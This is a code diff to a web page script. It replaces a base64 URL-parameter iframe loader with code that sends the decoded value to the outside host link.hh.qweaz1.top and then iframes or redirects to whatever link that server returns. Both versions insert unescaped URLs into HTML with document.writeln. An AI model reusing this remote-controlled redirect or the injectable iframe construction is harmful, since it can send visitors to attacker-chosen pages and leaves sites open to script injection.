@@ -295,20 +295,36 @@
 <script>
 var urlParams = new URLSearchParams(window.location.search);
 var encodedParam = urlParams.get('c');
-var tureurl = atob(encodedParam);
-if (tureurl.includes("http")) {
-var square = document.getElementById("container");
-setTimeout(function() {
-  square.style.display = "none";
-}, 1500);
- var html='<iframe class="content" οnlοad="bindMouseWhee(this)" src='+tureurl+'></iframe>';
-  document.writeln(html);
-console.log(tureurl);
-} else {
-  console.log("nourls");
-}
-  </script>
- <script>
+var ids = atob(encodedParam);
+
+const p = 'http://link.hh.qweaz1.top'
+
+fetch(p+'/index/index/checkUrlStatus', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ ids: ids })
+}).then(response => {
+    if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+    }
+    return response.json();
+})
+.then(res => {
+    let {status,msg,data} = res
+    if (status != 1) {
+        return alert(msg);
+    }
+    if (data.type == 1) {
+        var html='<iframe class="content" style="width: calc(100% + 16px );height: calc(100% + 16px );border: none;margin: -8px;" src='+data.link+'></iframe>';
+          document.writeln(html);
+    }
+    if (data.type == 2) {
+        window.location.href = data.link
+    }
+})
+
 var firefox = navigator.userAgent.indexOf('Firefox') != -1;
 function MouseWheel(e,doc){
   e.preventDefault && e.preventDefault(),e.returnValue = false;
@@ -320,7 +336,7 @@ function bindMouseWhee(ifr){
     var doc = ifr.contentWindow.document;
     firefox?doc.addEventListener('DOMMouseScroll',function(e){MouseWheel(e,doc)},false):(doc.onmousewheel = function(e){MouseWheel(e||ifr.contentWindow.event,doc)});
   }catch(e){
-    alert('12345678910跨域无法获取iframe加载document'+e);
+    alert('跨域无法获取iframe加载document'+e);
   }
 }
 </script> 
